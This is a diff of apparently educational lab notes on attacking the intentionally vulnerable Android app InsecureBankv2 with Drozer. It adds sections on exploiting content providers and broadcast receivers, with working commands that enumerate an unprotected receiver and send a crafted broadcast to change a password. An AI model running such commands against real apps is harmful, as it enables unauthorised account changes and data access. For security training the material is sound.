@@ -69,6 +69,8 @@ Attempting to run shell module
 
 <img width="343" height="461" alt="image" src="https://github.com/user-attachments/assets/374ab243-d4aa-45e8-9278-1852c9db74df" />
 
+## Exploiting Content Providers
+
 This app’s TrackUserContentProvider is completely unprotected.
 
 Any other app could:
@@ -143,3 +145,25 @@ Attempting to run shell module
 | table | names            | names            | 4        | CREATE TABLE names (id INTEGER PRIMARY KEY AUTOINCREMENT,  name TEXT NOT NULL) |
 | table | sqlite_sequence  | sqlite_sequence  | 5        | CREATE TABLE sqlite_sequence(name,seq)                                         |
 ```
+
+## Exploiting Broadcast Receivers
+
+```
+dz> run app.broadcast.info -a com.android.insecurebankv2 -i
+Attempting to run shell module
+Package: com.android.insecurebankv2
+  com.android.insecurebankv2.MyBroadCastReceiver
+    Intent Filter:
+      Actions:
+        - theBroadcast
+    Permission: null
+```
+
+<img width="591" alt="image" src="https://github.com/user-attachments/assets/0976fab6-bbfb-4c01-b827-cb908da42d6f" />
+
+```
+dz> run app.broadcast.send --action theBroadcast --extra string phonenumber 5554321 --extra string newpass Hello!@#
+Attempting to run shell module
+```
+
+
